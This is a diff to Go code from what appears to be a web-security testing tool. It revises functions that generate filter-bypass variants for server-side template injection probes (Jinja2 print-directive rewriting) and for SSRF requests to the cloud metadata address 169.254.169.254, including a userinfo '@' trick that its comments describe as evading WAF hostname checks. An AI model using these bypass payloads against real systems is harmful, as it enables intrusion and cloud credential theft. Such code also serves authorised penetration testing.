@@ -110,13 +110,10 @@ func SSTIBypass(expr string) []string {
 	// URL-encoded delimiters: {{7*7}} → %7B%7B7*7%7D%7D
 	variants = append(variants, urlEncodeBraces(expr))
 
-	// Unicode escapes for Jinja2: {{7*7}} → {%print(7*7)%}
-	if strings.Contains(expr, "{{") {
-		variants = append(variants, strings.Replace(expr, "{{", "{%print(", 1))
-		// Jinja2 alternative syntax: {% set x=7*7 %}{{x}}
-		variants = append(variants, strings.Replace(
-			strings.Replace(expr, "}}", ")%}", 1),
-			"{{", "{%print(", 1))
+	// Jinja2 print directive: {{7*7}} → {%print(7*7)%}
+	if strings.Contains(expr, "{{") && strings.Contains(expr, "}}") {
+		inner := strings.TrimPrefix(strings.TrimSuffix(expr, "}}"), "{{")
+		variants = append(variants, "{%print("+inner+")%}")
 	}
 
 	// Comment injection for Twig: {{7{# #}*7}}
@@ -154,8 +151,9 @@ func SSRFBypass(targetURL string) []string {
 		variants = append(variants, strings.ReplaceAll(targetURL, "169.254.169.254", "169.254.169.254."))
 		// IPv6 mapped
 		variants = append(variants, strings.ReplaceAll(targetURL, "169.254.169.254", "[::ffff:a9fe:a9fe]"))
-		// Redirect via URL shortener pattern
-		variants = append(variants, strings.ReplaceAll(targetURL, "http://169.254.169.254", "http://169.254.169.254@127.0.0.1"))
+		// Userinfo bypass: WAFs that check the hostname may not parse the @.
+		// http://foo@169.254.169.254 → HTTP client treats 169.254.169.254 as host.
+		variants = append(variants, strings.ReplaceAll(targetURL, "http://169.254.169.254", "http://foo@169.254.169.254"))
 	}
 
 	// Protocol-level bypasses
